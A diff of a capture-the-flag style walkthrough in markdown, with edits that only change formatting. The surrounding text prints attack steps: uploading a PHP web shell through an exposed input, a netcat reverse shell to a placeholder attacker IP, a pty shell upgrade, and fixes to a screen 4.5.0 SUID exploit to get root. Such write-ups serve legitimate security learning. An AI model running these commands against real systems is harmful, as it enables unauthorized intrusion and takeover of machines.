@@ -138,7 +138,7 @@ $ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-And now from the input in /exposed.php we curl it to uploads leveraging the `-o` (output file) flag:
+And now from the input in `/exposed.php` we curl it to uploads leveraging the `-o` (output file) flag (this time without the trick to execute commands from the input as we are just using curl as it is to fetch the shell):
 ```
 10.10.14.23:8000/Predator.php -o uploads/Predator.php
 ```
@@ -150,7 +150,7 @@ Set `nc` listener in the attacker to handle the reverse shell:
 nc -lvp 4444
 ```
 
-The webshell allows the user to execute in the target system. Connect to the attacker as follows:
+The web shell allows the user to execute in the target system. Connect to the attacker as follows:
 ```
 nc $IP_ATTACKER 4444 -e /bin/bash
 ```
@@ -160,7 +160,7 @@ Upgrade shell to more interactive one:
 python3 -c "import pty; pty.spawn('/bin/bash');"
 ```
 
-By running ```LinEnum.sh``` (copied to the target machine by setting up a Python http server as before), it can be noticed that there's a suspicious SUID executable in /usr/bin/screen-4.5.0, that turns out to be a vulnerable version that allows to escalate privileges:
+By running `LinEnum.sh` (copied to the target machine by setting up a Python http server as before), it can be noticed that there's a suspicious SUID executable in /usr/bin/screen-4.5.0, that turns out to be a vulnerable version that allows to escalate privileges:
 ```
 $ searchsploit screen 4.5.0
 ----------------------------------------------------------- ---------------------------------
@@ -176,7 +176,7 @@ I'd encourage you to first check the PoC to see what's going on, basically it is
 
 When trying to execute the script (first exploit listed) it's noticeable that it needs some manual action to be functional:
 - Change the way in which the script creates the .c files. It does is using `cat` and it does not work properly and adds more lines to the file that is not C code and naturally fails afterwards.
-- ```gcc``` fails to compile as it does not find ```cc1```. By doing ```locate cc1``` we see this is its location: ```/usr/lib/gcc/x86_64-linux-gnu/5```. Adding that to the path and trying again did the trick.
+- ```gcc``` fails to compile as it does not find `cc1`. By doing `locate cc1` we see this is its location: `/usr/lib/gcc/x86_64-linux-gnu/5`. Adding that to the path and trying again did the trick.
 
 After completing these manual actions, a root shell is popped after executing the script:
 ```
